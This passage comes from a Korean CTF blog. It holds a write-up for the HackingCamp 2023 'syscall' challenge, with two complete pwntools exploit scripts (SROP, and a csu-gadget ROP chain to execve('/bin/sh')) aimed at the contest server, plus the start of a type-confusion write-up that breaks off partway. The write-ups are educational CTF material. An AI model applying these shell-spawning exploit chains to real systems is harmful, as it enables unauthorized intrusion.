        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>올해도 어김없이 해킹캠프 문제 출제를 하였다. 대회 시간이 꽤 짧고 다른 어려운 포너블 문제가 있기 때문에 문제 풀이 해주신 분들은 풀이가 상대적으로 쉬운 <code>Sigreturn-oriented programming(SROP)</code>를 이용하여 문제를 풀이해주셨을 것이라 생각된다. 나는 문제 출제하면서 두 가지 방법으로 풀이하였고 정작 <code>SROP</code>는 생각이 나지 않아 다른 방법으로 푼 후에 <code>SROP</code>로 풀이하였다.</p><p>롸업을 작성하면서 생각든 건데 seccomp과 같은 것을 두지 않았으니 서버에 존재하는 flag 파일의 이름을 알아낸 다음, <code>openat, read, write</code> 해서 문제를 풀이할 수 있을 것 같다. 해당 방법은 언인텐이 아니며 초심자를 위한 해킹캠프 취지에 맞게 다양한 풀이가 가능하도록 보호 기법을 강하게 제한을 두지 않았다. 개인적으로 flag 값을 읽어오는 것보단 쉘 따는 것이 더 재밌기 때문에.. 해당 풀이는 소개하지 않는다.</p><blockquote><p>원하는 system call을 실행시켜보자!<br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a><br>tar -zxvf syscall-public.tar.gz</p></blockquote><ul><li>[ 3 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = sys_write(<span class="number">1u</span>, gloabl_buf, <span class="number">0xC</span>uLL);</span><br><span class="line">  v4 = sys_read(<span class="number">0</span>, buf, <span class="number">0x250</span>uLL); <span class="comment">// overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>전역변수에 적힌 값을 출력하고, 지역변수에 값을 입력 받는데 여기서 overflow가 대놓고 발생한다. 주어진 코드는 이게 다고, 내가 작성한 것을 출력해 주는 기능이 현재로선 존재하지 않기 때문에 뭔갈 leak할 수도 없어 보인다. 그러나 함수 목록을 보면 아래와 같은 hint 함수가 존재하고 유용한 가젯이 보인다. </p><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 14.33.13.png" width=500/><br><p>보기 쉽게 나타내면 아래 두 가젯이 눈에 보인다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rax, 0x1 ; ret ;</span><br><span class="line">syscall ; ret ;</span><br></pre></td></tr></table></figure><p>이것을 이용하여 우리는 원하는 system call을 실행시킬 수 있다. 문제 바이너리는 64bit 전용 ELF이니 문제 설명에 나와있던 사이트를 접속해보자.</p><ul><li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>overflow도 발생하겠다.. <code>rax</code> 레지스터를 조작하여 우리는 저 사이트에 있는 system call들을 실행시킬 수 있다.</p><h2 id="Solve-1-Sigreturn-oriented-programming-SROP"><a href="#Solve-1-Sigreturn-oriented-programming-SROP" class="headerlink" title="Solve 1 (Sigreturn-oriented programming(SROP))"></a>Solve 1 (Sigreturn-oriented programming(SROP))</h2><ul><li>Sigreturn system call을 사용하는 ROP 기법</li></ul><p>프로그램은 보안, 자원 관리 등의 이유로 user mode와 kernel mode를 왔다갔다 하면서 실행되는데 이 때 자원 공유가 필요하다. kernel mode에서 user mode로 갈 때 <code>Sigreturn system call</code>을 이용하여 user mode의 레지스터를 세팅한다. 저 시스템 콜을 사용하여 레지스터를 세팅할 때 값에 대한 검증이 이루어지지 않는다. 그래서 우리는 <code>Sigreturn system call</code>을 강제로 호출하여 레지스터를 마음대로 바꿀 수 있다.</p><p><code>pwntools</code>의 <code>frame = SigreturnFrame()</code>을 이용하여 매우 편리하게 코드를 작성할 수 있다.</p><ul><li>exploit 시나리오</li></ul><ol><li>전역변수에 <code>/bin/sh\x00</code> 작성 -&gt; <code>read(0, 0x404028, 8)</code></li><li>main으로 돌림</li><li><code>SigreturnFrame()</code>을 이용하여 편리하게 레지스터 세팅 -&gt; <code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>을 실행시키기 위함</li><li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code> 실행</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = <span class="number">0x404028</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>): </span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Solve-2-run-execute-‘-x2F-bin-x2F-sh-x00’-0-0"><a href="#Solve-2-run-execute-‘-x2F-bin-x2F-sh-x00’-0-0" class="headerlink" title="Solve 2 (run execute(‘&#x2F;bin&#x2F;sh\x00’, 0, 0))"></a>Solve 2 (run execute(‘&#x2F;bin&#x2F;sh\x00’, 0, 0))</h2><p>SROP 기법을 이용하지 않고 <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>을 실행시키는 것을 목표로 두는 풀이이다. </p><ol><li><p><code>write(1, stack주소, ?)</code> 호출<br>main 함수에서 <code>sys_read(0, buf, 0x250uLL);</code> 실행하고 난 뒤기 때문에 <code>rax</code> 레지스터와 <code>rdi</code> 레지스터만 수정해서 <code>write</code> 함수를 호출하여 stack 주소를 leak할 수 있다. (stack에 쓰여진 건 모두 leak할 수 있고 stack에는 stack 주소도 대부분 적혀있다.)</p></li><li><p><code>read(0, 0x404028, 8)</code> 호출<br>bss 영역에 ‘&#x2F;bin&#x2F;sh\x00’을 쓸 것이다. 쓰고 난 후 <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>을 실행할 예정이다.</p></li><li><p><code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code> 호출<br>인자 세 개를 조절해야 한다. 이 때 <code>rdx</code>를 조절하기 적당한 가젯이 없어서 <code>csu gadget</code>을 이용하였다.</p></li></ol><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 15.09.07.png" width=600/><p>이 때 <code>[r15 + rbx*8]</code> 에는 현재 작성한 payload의 아래 부분을 작성해주는 것이 유리하다. 1번 과정에서 stack 주소를 leak했으니 우리 payload가 어느 주소에 적힌지도 구할 수 있다. 익스 코드 주석을 보면 나는 <code>rdi</code> 레지스터를 세팅해주는 곳을 가리켰다. 정리하면 <code>csu</code> 가젯으로 <code>edi</code>, <code>rsi</code>, <code>rdx</code> 모두 세팅할 수 있는데 다 0으로 해놓고 후에 <code>rdi</code>를 다시 세팅해줬다.</p><p>편리하게 write, read, execute 함수 자체를 호출하는 것처럼 시나리오를 작성하였지만 호출해야할 것은 system call이라는 것을 잊지 말자. system call이니 만큼 함수를 호출하면 안되고 문제 설명의 사이트를 참고하여 올바른 값으로 <code>rax</code> 레지스터를 세팅한 다음 <code>syscall</code> 가젯을 호출해야 한다. 그리고 현재 레지스터의 상황에 맞게 <code>add rax, 0x1 ; ret ;</code> 가젯을 호출하자. 0x3b로 세팅해줘야 한다고 무작정 0x3b번 호출하면 안된다는 뜻이다. 왜냐하면 그 당시 <code>rax</code> 레지스터가 0이란 보장을 할 수 없기 때문이다. </p><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line">pop_rdi = <span class="number">0x4011c3</span></span><br><span class="line"></span><br><span class="line">csu_init = <span class="number">0x4011BA</span></span><br><span class="line">csu_call = <span class="number">0x4011A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">0x68</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(csu_init) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r12 (edi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r13 (rsi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r14 (rdx)</span></span><br><span class="line">payload += p64(stack - <span class="number">0x60</span>) <span class="comment"># [r15 + rbx*8] stack-0x60 = pop_rdi ...</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) <span class="comment"># &lt;- stack-0x60 is here</span></span><br><span class="line">payload += p64(<span class="number">0x404028</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x3b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x33</span>): <span class="comment"># rax = 0x8</span></span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;cf518127a07c471e00dcfca20a5ca08f&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HCAMP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> SROP </tag>
            
            <tag> csu gagdet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)</title>
      <link href="/230211-hcamp2023w-super_calculator/"/>
      <url>/230211-hcamp2023w-super_calculator/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>같은 Demon 팀의 수민님이 내신 문제다. 대회 전에 문제 검수하면서 스스로 풀어봤는데 이때까지 한 검수 중에서 세 손가락 안에 들 정도로 재밌는 문제여서 블로그에 꼭 기록하고 싶었다. 이 문제를 풀면서 디버깅을 굉장히 많이 하였다.. 미리 스포하자면 이 문제는 Chrome은 아니지만 Chrome 1-day와 관련있는데 나중에 시간이 난다면.. 관련 내용을 블로그에 적어 공유할까 싶기도 한다. (안 할 수도 있다.)</p><blockquote><p>Hello my name is Calculator</p></blockquote><ul><li>[ 1 solves &#x2F; 500 points]</li></ul><p>아래는 solve가 0일 때 나온 힌트이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ref. 1day Vulnerbility : https://bugs.chromium.org/p/chromium/issues/detail?id=1315192 (type confusion lead to oob)</span><br><span class="line"></span><br><span class="line">Hint : Static_cast, C++, NaN, Infinity, Buffer Overflow</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main 부터 살펴봤다. (분석하면서 call_num의 타입을 struct를 하나 새로 만들어서 지정해주었다.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">cal_num = <span class="built_in">malloc</span>(<span class="number">0x138</span>uLL);</span><br><span class="line">setup();</span><br><span class="line">v3 = cal_num;</span><br><span class="line">v3-&gt;_int32 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v4 = cal_num;</span><br><span class="line">v4-&gt;_int33 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v5 = cal_num;</span><br><span class="line">v5-&gt;_int34 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br><span class="line">v6 = cal_num;</span><br><span class="line">v6-&gt;_float35 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v7 = cal_num;</span><br><span class="line">v7-&gt;_float36 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v8 = cal_num;</span><br><span class="line">v8-&gt;_float37 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br></pre></td></tr></table></figure><p><code>setup()</code> 함수는 안봐도 되는 함수다. 스포를 하자면 <code>*cal_num-&gt;_int34</code>와 <code>*cal_num-&gt;_float37</code>을 주시해야 한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Banner();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v10);</span><br><span class="line">    <span class="keyword">switch</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Interger_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Real_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        overflow();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Number_change();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Print_number();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Print_Note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>기능이 6가지가 있으며 내가 적은 숫자에 따라 각 기능이 실행된다. 일단 취약점을 찾아야 하니까 취약점일 것 같은 것들 위주로 빠르게 살펴봤다. 처음에 하나하나씩 빠르게 열어보고 세 번째 기능 함수를 보고 다시 첫 번째와 두 번째 함수를 살펴봤다.</p><p>세 번째 기능 함수는 <code>overflow</code> 날 것 같이 생겨서 보자마자 <code>overflow</code>로 함수 명을 바꾸어주었다. (ctf니까 여기서 overflow가 나야 뭔갈 할 수 있겠다고 생각했다.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)cal_num-&gt;_int34 || *cal_num-&gt;_float37 != <span class="number">0.0</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, cal_num, *(<span class="type">unsigned</span> <span class="type">int</span> *)cal_num-&gt;_int34);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Interger_cal()</code>함수에서는 취약점일 것처럼 생긴게 안보였다. 하나 특징이 있다면 한 수식을 사용자로부터 입력받고 그 수식에 대한 연산을 진행하는데 연산 결과가 <code>*cal_num-&gt;_int34</code>에 담긴다는 것이다. <code>int</code> 연산 결과가 <code>int</code> 타입의 변수에 담기고 음수 연산도 잘 예외처리가 되어있어서 일단 넘어갔다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Real_cal</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Real cal&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *cal_num-&gt;_float37 == <span class="number">0.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1f %c %1f&quot;</span>, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s2) )</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">2</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)cal_num-&gt;_int34 = (<span class="type">int</span>)(<span class="type">float</span>)(*cal_num-&gt;_float35 - *cal_num-&gt;_float36); <span class="comment">// [*]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">4</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 